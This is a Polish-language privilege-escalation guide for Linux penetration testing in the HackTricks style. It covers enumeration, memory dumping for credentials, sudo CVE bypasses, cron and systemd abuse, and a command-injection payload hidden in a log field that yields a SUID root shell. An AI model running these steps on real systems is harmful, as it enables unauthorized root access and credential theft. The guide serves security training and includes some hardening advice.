# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy zdobywać informacje o działającym systemie operacyjnym.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Jeśli **masz uprawnienia zapisu w jakimkolwiek folderze zawartym w zmiennej `PATH`**, możesz być w stanie hijack some libraries or binaries:
```bash
echo $PATH
```
### Informacje środowiskowe

Interesujące informacje, hasła lub klucze API w zmiennych środowiskowych?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję jądra i czy istnieje jakiś exploit, który można użyć do eskalacji uprawnień
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą vulnerable kernel listę i niektóre już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, gdzie możesz znaleźć niektóre **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie vulnerable kernel versions z tej strony możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchomić NA ofierze, sprawdza tylko exploity dla kernel 2.x)

Zawsze **wyszukaj wersję kernela w Google**, być może twoja wersja kernela jest zapisana w opisie jakiegoś kernel exploit i wtedy będziesz mieć pewność, że exploit działa.

Dodatkowe techniki eksploatacji kernela:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja sudo

Na podstawie podatnych wersji sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Wersje sudo wcześniejsze niż 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) umożliwiają nieuprzywilejowanym użytkownikom lokalnym eskalację uprawnień do roota za pomocą opcji sudo `--chroot`, gdy plik `/etc/nsswitch.conf` jest używany z katalogu kontrolowanego przez użytkownika.

Poniżej znajduje się [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) umożliwiający wykorzystanie tej [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploita upewnij się, że Twoja wersja `sudo` jest podatna i że obsługuje funkcję `chroot`.

Więcej informacji znajdziesz w oryginalnym [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo — obejście reguł opartych na hoście (CVE-2025-32462)

Wersje sudo wcześniejsze niż 1.9.17p1 (zgłoszony zakres dotkniętych wersji: **1.8.8–1.9.17**) mogą oceniać reguły sudoers zależne od hosta, używając **nazwa hosta podana przez użytkownika** z `sudo -h <host>` zamiast **rzeczywista nazwa hosta**. Jeśli sudoers przyznaje szersze uprawnienia na innym hoście, możesz lokalnie **spoof** tego hosta.
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Eksploatacja przez podszycie się pod dozwolonego hosta:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Jeśli rozwiązywanie spoofed name jest zablokowane, dodaj wpis do `/etc/hosts` lub użyj nazwy hosta, która już pojawia się w logach/konfiguracjach, aby uniknąć DNS lookups.

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: weryfikacja sygnatury nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład** tego, jak ta vuln mogła zostać wykorzystana.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe środki obronne

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Jeśli znajdujesz się w container, zacznij od sekcji container-security, a następnie przejdź do stron dotyczących nadużyć specyficznych dla runtime:


{{#ref}}
container-security/
{{#endref}}

## Dyski

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy nie zawiera danych prywatnych
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne pliki binarne
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź też, czy **any compiler is installed**. Przyda się to, jeśli będziesz musiał użyć jakiegoś kernel exploit — zaleca się compile it na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Może istnieć jakaś stara wersja Nagios (na przykład), którą można wykorzystać do eskalacji uprawnień…\
Zaleca się ręczne sprawdzenie wersji najbardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Zwróć uwagę, że te polecenia wyświetlą dużo informacji, które przeważnie będą bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy zainstalowana wersja oprogramowania jest podatna na znane exploits_

## Procesy

Spójrz na to, **jakie procesy** są uruchamiane i sprawdź, czy któryś proces nie ma **więcej uprawnień niż powinien** (może tomcat jest uruchomiony jako root?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** działające, możesz ich nadużyć do eskalacji uprawnień](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w linii poleceń procesu.\  
Sprawdź także **swoje uprawnienia do plików binarnych procesów**, może uda ci się nadpisać czyjś plik binarny.

### Łańcuchy rodzic–dziecko między użytkownikami

Proces potomny uruchomiony pod **innym użytkownikiem** niż proces macierzysty nie jest automatycznie złośliwy, ale jest to użyteczny **triage signal**. Niektóre przejścia są oczekiwane (`root` uruchamiający konto usługowe, menedżery logowania tworzące procesy sesji), ale nietypowe łańcuchy mogą ujawnić wrappers, debug helpers, persistence lub weak runtime trust boundaries.
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Jeśli znajdziesz zaskakujący łańcuch, sprawdź linię poleceń procesu nadrzędnego oraz wszystkie pliki wpływające na jego działanie (`config`, `EnvironmentFile`, skrypty pomocnicze, katalog roboczy, zapisywalne argumenty). W kilku rzeczywistych ścieżkach privesc sam proces potomny nie był zapisywalny, ale **parent-controlled config** lub łańcuch pomocniczy był.

### Usunięte pliki wykonywalne i pliki otwarte po usunięciu

Artefakty w czasie wykonywania często są nadal dostępne **po usunięciu**. Jest to przydatne zarówno do privilege escalation, jak i do odzyskiwania dowodów z procesu, który już ma otwarte wrażliwe pliki.

Sprawdź usunięte pliki wykonywalne:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Jeśli `/proc/<PID>/exe` wskazuje na `(deleted)`, proces nadal uruchamia stary obraz binarny z pamięci. To silny sygnał do zbadania, ponieważ:

- usunięty plik wykonywalny może zawierać interesujące ciągi znaków lub poświadczenia
- uruchomiony proces może nadal mieć otwarte przydatne deskryptory plików
- usunięty uprzywilejowany plik binarny może wskazywać na niedawne manipulacje lub próbę sprzątania

Zbierz w całym systemie usunięte, nadal otwarte pliki:
```bash
lsof +L1
```
Jeśli znajdziesz interesujący deskryptor, odzyskaj go bezpośrednio:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Jest to szczególnie wartościowe, gdy proces wciąż ma otwarty usunięty sekret, skrypt, eksport bazy danych lub flag file.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikacji podatnych procesów uruchamianych często lub wtedy, gdy spełniony jest określony zestaw wymagań.

### Pamięć procesu

Niektóre usługi serwera zapisują **credentials w postaci jawnego tekstu w pamięci**.\
Zazwyczaj będziesz potrzebować **uprawnień root** aby czytać pamięć procesów należących do innych użytkowników, dlatego zwykle jest to bardziej przydatne, gdy już jesteś root i chcesz odnaleźć więcej credentials.\
Jednak pamiętaj, że **jako zwykły użytkownik możesz czytać pamięć procesów, które posiadasz**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. To klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: tylko proces macierzysty może być debugowany.
> - **kernel.yama.ptrace_scope = 2**: Tylko admin może używać ptrace, ponieważ wymagane jest uprawnienie CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Żadne procesy nie mogą być śledzone za pomocą ptrace. Po ustawieniu wymagane jest ponowne uruchomienie, aby ponownie włączyć ptrace.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz wydobyć Heap i przeszukać w nim credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skrypt
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego ID procesu, **maps pokazują, jak pamięć jest mapowana w** wirtualnej przestrzeni adresowej tego procesu; pokazują też **uprawnienia każdego zmapowanego obszaru**. Pseudoplik **mem** **ujawnia samą pamięć procesu**. Z pliku **maps** wiemy, które **obszary pamięci są czytelne** i ich offsety. Wykorzystujemy te informacje, aby **seek into the mem file and dump all readable regions** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do systemowej **pamięci fizycznej**, a nie pamięci wirtualnej. Przestrzeń adresowa wirtualna jądra jest dostępna za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla linux

ProcDump to wersja dla Linux będąca reinterpretacją klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz ją z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania roota i zrzucić proces należący do ciebie
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli stwierdzisz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz zrzucić pamięć procesu (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby zrzucania pamięci procesu) i przeszukać ją w poszukiwaniu poświadczeń:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) będzie **kraść poświadczenia w postaci jawnego tekstu z pamięci** i z niektórych **dobrze znanych plików**. Wymaga uprawnień root, aby działać poprawnie.

| Cecha                                            | Nazwa procesu        |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH - użycie sudo)         | sshd:                |

#### Wzorce wyszukiwania/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane zadania/Cron

### Crontab UI (alseambusher) działający jako root – web-based scheduler privesc

Jeśli panel webowy “Crontab UI” (alseambusher/crontab-ui) działa jako root i jest związany tylko z loopback, możesz nadal uzyskać do niego dostęp przez lokalne przekierowanie portu SSH i utworzyć uprzywilejowane zadanie, aby eskalować.

Typowy łańcuch
- Odkryj port dostępny tylko na loopback (np. 127.0.0.1:8000) oraz realm Basic-Auth używając `ss -ntlp` / `curl -v localhost:8000`
- Znajdź poświadczenia w artefaktach operacyjnych:
- Kopie zapasowe/skrypty z `zip -P <password>`
- Jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tuneluj i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie z wysokimi uprawnieniami i uruchom je natychmiast (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Nie uruchamiaj Crontab UI jako root; ogranicz go do dedykowanego użytkownika z minimalnymi uprawnieniami
- Nasłuchuj tylko na localhost i dodatkowo ogranicz dostęp za pomocą firewall/VPN; nie używaj ponownie haseł
- Unikaj osadzania sekretów w unit files; używaj secret stores lub root-only EnvironmentFile
- Włącz audit/logging dla on-demand job executions

Sprawdź, czy któreś zaplanowane zadanie jest podatne. Może uda się wykorzystać skrypt uruchamiany przez root (wildcard vuln? można modyfikować pliki, z których korzysta root? użyć symlinks? utworzyć konkretne pliki w katalogu, którego używa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Jeśli używany jest `run-parts`, sprawdź, które nazwy faktycznie zostaną wykonane:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
To zapobiega fałszywym alarmom. Zapisywalny katalog periodyczny jest użyteczny tylko wtedy, gdy nazwa pliku z payloadem pasuje do lokalnych reguł `run-parts`.

### Ścieżka Cron

Na przykład, w _/etc/crontab_ możesz znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zauważ, że użytkownik "user" ma uprawnienia do zapisu w /home/user_)

Jeśli w tym crontabie użytkownik root próbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell, używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany przez root zawiera “**\***” w poleceniu, możesz to wykorzystać do wykonania nieoczekiwanych rzeczy (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następującą stronę, aby uzyskać więcej wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash wykonuje parameter expansion i command substitution przed oceną arytmetyczną w ((...)), $((...)) i let. Jeśli rootowy cron/parser odczytuje niezaufane pola logów i przekazuje je do kontekstu arytmetycznego, atakujący może wstrzyknąć command substitution $(...), który wykona się jako root, gdy cron się uruchomi.

- Dlaczego to działa: W Bash ekspansje zachodzą w tej kolejności: parameter/variable expansion, command substitution, arithmetic expansion, następnie word splitting i pathname expansion. Zatem wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` jest najpierw podstawiana (uruchamiając polecenie), a pozostała numeryczna `0` jest używana w obliczeniu, więc skrypt kontynuuje bez błędów.

- Typowy podatny wzorzec:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Spowoduj zapisanie tekstu kontrolowanego przez atakującego do parsowanego loga tak, aby pole wyglądające na liczbowe zawierało command substitution i kończyło się cyfrą. Upewnij się, że Twoje polecenie nie wypisuje nic na stdout (lub je przekieruj), aby arytmetyka pozostała ważna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Jeśli **możesz zmodyfikować cron script** uruchamiany przez root, możesz bardzo łatwo uzyskać shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli skrypt uruchamiany przez root używa katalogu, do którego masz pełny dostęp, może być przydatne usunięcie tego katalogu i utworzenie symlink wskazującego na inny katalog zawierający skrypt kontrolowany przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Walidacja symlinków i bezpieczniejsze operacje na plikach

Podczas przeglądania skryptów/binarek uruchamianych z podwyższonymi uprawnieniami, które odczytują lub zapisują pliki po ścieżce, sprawdź, jak obsługiwane są linki:

- `stat()` podąża za symlinkiem i zwraca metadane docelowego pliku.
- `lstat()` zwraca metadane samego linku.
- `readlink -f` i `namei -l` pomagają ustalić ostateczny cel i pokazują uprawnienia każdego elementu ścieżki.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Dla obrońców/deweloperów, bezpieczniejsze wzorce przeciwko symlink tricks obejmują:

- `O_EXCL` z `O_CREAT`: zakończ błędem, jeśli ścieżka już istnieje (blocks attacker pre-created links/files).
- `openat()`: działaj względem deskryptora pliku zaufanego katalogu.
- `mkstemp()`: twórz pliki tymczasowe atomowo z bezpiecznymi uprawnieniami.

### Custom-signed cron binaries with writable payloads
Blue teams czasami "sign" cron-driven binaries przez zrzucenie niestandardowej sekcji ELF i greppowanie vendor string przed uruchomieniem ich jako root. Jeśli ten binary jest group-writable (np. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) i możesz leak the signing material, możesz sfałszować sekcję i przejąć zadanie cron:

1. Użyj `pspy` żeby przechwycić verification flow. W Era, root uruchomił `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` i następnie wykonał plik.
2. Odtwórz oczekiwany certyfikat używając the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Zbuduj złośliwy zamiennik (np. drop a SUID bash, add your SSH key) i osadź certyfikat w `.text_sig`, tak aby grep przeszedł:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Nadpisz zaplanowane binary zachowując bity wykonania:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Poczekaj na następne uruchomienie cron; kiedy naiwny signature check powiedzie się, twój payload uruchomi się jako root.

### Frequent cron jobs

Możesz monitorować procesy, aby wyszukać te, które są wykonywane co 1, 2 lub 5 minut. Może uda się to wykorzystać i eskalować uprawnienia.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz też użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wypisywać każdy uruchamiany proces).

### Kopie zapasowe uruchamiane przez root, które zachowują ustawione przez atakującego bity trybu (pg_basebackup)

Jeśli cron należący do root uruchamia `pg_basebackup` (lub dowolne rekursywne kopiowanie) wobec katalogu bazy danych, do którego możesz zapisywać, możesz podłożyć **SUID/SGID binary**, który zostanie ponownie skopiowany jako **root:root** z tymi samymi bitami trybu do wyniku kopii zapasowej.

Typowy proces wykrywania (jako użytkownik DB o niskich uprawnieniach):
- Użyj `pspy`, aby wykryć cron uruchamiany przez root wywołujący coś w stylu `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` co minutę.
- Potwierdź, że źródłowy klaster (np. `/var/lib/postgresql/14/main`) jest zapisywalny przez ciebie oraz że miejsce docelowe (`/opt/backups/current`) staje się własnością root po wykonaniu zadania.

Eksploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
To działa, ponieważ `pg_basebackup` zachowuje bity trybu pliku podczas kopiowania klastra; gdy jest uruchamiany przez root, pliki docelowe dziedziczą **własność roota + SUID/SGID wybrany przez atakującego**. Każda podobna uprzywilejowana procedura backup/copy, która zachowuje uprawnienia i zapisuje do lokalizacji wykonywalnej, jest podatna.

### Niewidoczne cron jobs

Możliwe jest utworzenie cronjoba **umieszczając carriage return po komentarzu** (bez znaku nowej linii), i cron job będzie działać. Przykład (zauważ znak carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Aby wykryć tego rodzaju ukryte wejście, sprawdź cron files za pomocą narzędzi, które ujawniają znaki kontrolne:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Usługi

### Zapisywalne _.service_ pliki

Sprawdź, czy możesz zapisać dowolny `.service` plik; jeśli tak, możesz go **zmodyfikować**, tak aby **uruchamiał** twój **backdoor gdy** usługa jest **uruchamiana**, **restartowana** lub **zatrzymywana** (może być konieczne poczekanie na ponowne uruchomienie maszyny).\
Na przykład utwórz swój backdoor wewnątrz pliku `.service` używając **`ExecStart=/tmp/script.sh`**

### Zapisywalne pliki binarne usług

Pamiętaj, że jeśli masz **uprawnienia zapisu do binariów uruchamianych przez usługi**, możesz je zmienić na backdoory, więc gdy usługi zostaną ponownie uruchomione, backdoory zostaną wykonane.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli okaże się, że możesz **zapisywać** w którymkolwiek z katalogów na ścieżce, możesz być w stanie **escalate privileges**. Musisz szukać **ścieżek względnych używanych w plikach konfiguracji usług** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie stwórz **plik wykonywalny** o **tej samej nazwie co relative path binary** wewnątrz folderu systemd PATH, do którego możesz zapisywać, i gdy usługa zostanie poproszona o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twój **backdoor** zostanie uruchomiony (użytkownicy bez uprawnień zwykle nie mogą startować/stopować usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**` i które kontrolują pliki lub zdarzenia `**.service**`. **Timery** mogą być użyte jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń opartych na kalendarzu oraz monotonicznych zdarzeń czasowych i mogą być uruchamiane asynchronicznie.

Możesz wylistować wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz spowodować uruchomienie niektórych istniejących jednostek systemd.unit (np. `.service` lub `.target`).
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest Unit:

